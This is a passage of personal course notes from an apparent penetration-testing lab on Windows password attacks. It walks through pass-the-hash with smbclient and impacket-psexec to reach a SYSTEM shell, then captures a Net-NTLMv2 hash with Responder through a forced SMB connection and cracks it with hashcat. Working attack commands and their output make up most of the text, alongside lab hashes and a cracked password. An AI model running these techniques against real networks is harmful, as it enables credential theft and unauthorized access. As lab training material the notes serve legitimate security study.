+- We save `Administrator:7a38310ea6f0027ee955abed1762964b` for later use
+- to leverage PtH we need tools that support auth with NTLM hashes
+	- SMB enumeration and management
+		- [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
+		- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
+	- Command exec
+		- scripts from [impacket](https://github.com/SecureAuthCorp/impacket)
+			- [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)
+			- [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
+	- We can also utilize the hash with protocols other than SMB
+		- RDP
+		- [WinRM](https://docs.microsoft.com/en-us/windows/win32/winrm/portal)
+	- If the user has the proper privs Mimikatz can PtR as well
+
+Since the goal of this example is to gain access to a SMB share with a NTLM hash, we will use **smbclient**.
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ smbclient \\\\192.168.218.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Thu Jun  2 13:55:37 2022
+  ..                                DHS        0  Mon Oct  2 17:37:03 2023
+  secrets.txt                         A       16  Thu Sep  1 09:23:32 2022
+
+		4554239 blocks of size 4096. 1601367 blocks available
+smb: \> get secrets.txt 
+getting file \secrets.txt of size 16 as secrets.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+```
+- After connecting
+	- we can list files with `dir`
+	- and user the `get` command to download files
+
+In the next example we will use a NTLM hash to obtain and interactive shell.  We have a variety of tools available to us for this purpose, but here we will utilize `psexec.py` from the **impacket** library.
+- Similar to the Sysinternals [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)
+	- it searches for a writable share and uploads an executable
+	- it then registers the exe as a service and starts it
+		- often allowing us to obtain and interactive shell or code exec
+- On Kali we will use [impacket-scripts](https://www.kali.org/tools/impacket-scripts/) to execute `psexec.py`
+	- The package contains links to the example scripts of impacket lib
+	- provides a user friendly way to use them
+- To exec `psexec`
+	- enter `impacket-psexec`
+		- takes two args
+			- NTLM hash with `-hashes`
+				- format `LMHash:NTHash`
+					- Specify the Administrator NTLM hash after the colon
+					- We do not use the LMHash and will fill the section with 32* `0`
+			- The next arg determines the command psexec will execute on the target system
+				- Leave it blank to exec `cmd.exe` providing an interactive shell
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ export VM1='192.168.235.212'                                           
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@$VM1
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Requesting shares on 192.168.235.212.....
+[*] Found writable share ADMIN$
+[*] Uploading file rPHCvorK.exe
+[*] Opening SVCManager on 192.168.235.212.....
+[*] Creating service tlrC on 192.168.235.212.....
+[*] Starting service tlrC.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.707]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> hostname
+FILES02
+
+C:\Windows\system32> ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   Link-local IPv6 Address . . . . . : fe80::db9:6e33:8a47:418d%4
+   IPv4 Address. . . . . . . . . . . : 192.168.235.212
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.235.254
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> type \Users\Administrator\Desktop\flag.txt
+OS{8a086f3cf90e934c5a9bfbebfddc73aa}
+```
+- We obtained a shell as the *Administrator* user with *wmiexec* instead of *SYSTEM*
+
+In this section we used PtR to gain access to a SMB share and to obtain an interactive shell with `impacket-psexec` and `impacket-wmiexec`
+
+
+### Cracking Net-NTLMv2
+
+In some engagements we may obtain code exec or a shell on a Win system as an unpriv user, in this case we are unable to use tools like Mimikatz to extract passwords or NTLM hashes.  We are able to abuse Net-NTLMv2 network auth proto, which is responsible for managing Win client and server auth over a network.
+
+*We use "Net-NTLMv2" to refer to the formally correct NTLMv2. Since "Net-NTLMv2" is more commonly used in our industry, we use it in this course to avoid confusion.*
+
+This example will walk through the basics of the auth process, our goal will be to gain access to a SMB share of a Win 2022 server from a Win 11 client via Net-NTLMv2.
+
+Our goal is to utilize Net-NTLMv2 which is less secure than the more modern [Kerberos](https://en.wikipedia.org/wiki/Kerberos_(protocol)) proto, which is common in real world since many environments rely on the older proto as a way to support older devices.
+
+We will find Net-NTLMv2 in almost all Win networks so it is vital for us to understand how we can leverage it's weaknesses.  We need our target system to start an auth process using Net-NTLMv2 against the system we control.  We will need to prepare our system to handle the auth process and show us the Net-NTLMv2 hash the target used to auth.
+
+An excellent tool for this purpose is [Responder](https://github.com/lgandx/Responder) which includes a built-in SMB server, that handles the auth process, and prints out the captured Net-NTLMv2 hashes.  It also handles other proto servers including HTTP, FTP, as well as [Link-Local Multicast Name Resolution (LLMNR)](https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution), [NetBIOS Name Service (NBT-NS)](https://en.wikipedia.org/wiki/NetBIOS), and [Multicast DNS (MDNS)](https://en.wikipedia.org/wiki/Multicast_DNS) poisoning capabilities.
+
+We will focus on capturing Net-NTLMv2 hashes with the SMB server in this section.
+
+If we have code exec on a remote system we can easily force it to auth with us by commanding it to connect to our prepared SMB server.  For example:
+- In PowerShell on the remote systems
+	- run `ls \\{OurAttackingIP}\share`
+If we do not have code exec we can use other vectors to force auth.  For example:
+- If we discover an upload form in a web app on a Win server
+	- we can enter a non-existent file with a UNC path like
+		- `\\{OurAttackingIP}\share\nonexistent.txt`
+			- If the web app supports uploads via SMB, the Win server will auth to our SMB server
+
+Let's capture and crack a Net-NTLMv2 hash!
+- Setup Responder on our Kali machine as an SMB server
+- using FILES01 as the target
+- assume we used an attack vector to exec a bind shell on the target sys
+	- We'll connect to port 4444 with Netcat where our bind shell is running
+	- once connected, run `whoami` to check which user we are running as
+	- then use `net user` to check if the user is a member of the local `Administrators` group
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ nc $VM1 4444               
+Microsoft Windows [Version 10.0.20348.707]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+files01\paul
+
+C:\Windows\system32>net user
+net user
+
+User accounts for \\FILES01
+
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           files02admin             
+Guest                    gunther                  paul                     
+WDAGUtilityAccount       
+The command completed successfully.
+
+
+C:\Windows\system32>net user paul
+net user paul
+User name                    paul
+Full Name                    paul power
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            6/3/2022 10:57:06 AM
+Password expires             Never
+Password changeable          6/3/2022 10:57:06 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   10/3/2023 7:48:03 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Desktop Users *Users                
+Global Group memberships     *None                 
+The command completed successfully.
+```
+- The output indicates we are user `paul`
+	- not a local admin on FILES01
+	- Interesting; the `paul` user is a member of `Remote Desktop Users` group
+		- allowing the user to connect to the system via RDP
+- Assume the user `gunther` does not exist or we do not have access to the account
+	- in this example we only have access to `paul` on this sys
+- We do not have privs to run Mimikatz
+	- therefore we cannot extract passwords from the sys
+	- we can set up a SMB server with `Responder` on our Kali machine
+		- then connect to it with user `paul`
+			- capturing the Net-NTLMv2 hash, which we will crack
+- From our attacking machine
+	- determine interface with `ip a`
+	- run `sudo responder`
+		- set the listening interface with `-I`
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ sudo responder -I tun0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
+  To support this project:
+  Patreon -> https://www.patreon.com/PythonResponder
+  Paypal  -> https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+...
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+...
+
+[+] Listening for events...
+```
+- Responder is now listening for events with SMB server active
+- Next, we request access to a non-existent SMB share on our Responder SMB server using the `paul` user bind shell
+	- a simple `dir \\{OurAttackingIP}\test`
+```powershell
+C:\Windows\system32>dir \\192.168.45.195\test
+dir \\192.168.45.195\test
+Access is denied.
+```
+- Responder has captured `paul` user's Net-NTMLv2 hash.
+	- we will save it to `paul.hash` for cracking with Hashcat
+```
+[SMB] NTLMv2-SSP Client   : 192.168.235.211
+[SMB] NTLMv2-SSP Username : FILES01\paul
+[SMB] NTLMv2-SSP Hash     : paul::FILES01:05178681ba6f770b:223EAC5B2CBF02874E52C26A44DA040F:010100000000000000E8CCC733F6D901B9D2739FA180242B0000000002000800300037003500430001001E00570049004E002D00410047004A005600320057004900330033005400570004003400570049004E002D00410047004A00560032005700490033003300540057002E0030003700350043002E004C004F00430041004C000300140030003700350043002E004C004F00430041004C000500140030003700350043002E004C004F00430041004C000700080000E8CCC733F6D9010600040002000000080030003000000000000000000000000020000005702329B5B030AC6DEE1532D17E50447A64CB629A3F044FD28311866F454CAE0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100390035000000000000000000
+```
+- find the correct mode with Hashcat, which is `5600`
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashcat --help | grep -i "ntlm"
+   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
+  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
+   5600 | NetNTLMv2                                                  | Network Protocol
+  27100 | NetNTLMv2 (NT)                                             | Network Protocol
+   1000 | NTLM                                                       | Operating System
+```
+- we can now attempt to crack the hash with `rockyou.txt`
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
+hashcat (v6.2.6) starting
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+
+...
+
+PAUL::FILES01:05178681ba6f770b:223eac5b2cbf02874e52c26a44da040f:010100000000000000e8ccc733f6d901b9d2739fa180242b0000000002000800300037003500430001001e00570049004e002d00410047004a005600320057004900330033005400570004003400570049004e002d00410047004a00560032005700490033003300540057002e0030003700350043002e004c004f00430041004c000300140030003700350043002e004c004f00430041004c000500140030003700350043002e004c004f00430041004c000700080000e8ccc733f6d9010600040002000000080030003000000000000000000000000020000005702329b5b030ac6dee1532d17e50447a64cb629a3f044fd28311866f454cae0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003100390035000000000000000000:123Password123
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)
+Hash.Target......: PAUL::FILES01:05178681ba6f770b:223eac5b2cbf02874e52...000000
+```
+Time.Started.....: Tue Oct  3 20:06:22 2023, (6 secs)
+Time.Estimated...: Tue Oct  3 20:06:28 2023, (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  2435.3 kH/s (2.61ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 13336576/14344385 (92.97%)
+Rejected.........: 0/13336576 (0.00%)
+Restore.Point....: 13328384/14344385 (92.92%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: 123gd123gd -> 12359367
+Hardware.Mon.#1..: Temp: 51c Util: 81%
+
+Started: Tue Oct  3 20:06:07 2023
+Stopped: Tue Oct  3 20:06:30 2023
+```
+
+- We have cracked the Net-NTLMv2 hash!
+	- `paul:123Password123`
+- We can now connect to to FILES01 using RDP!
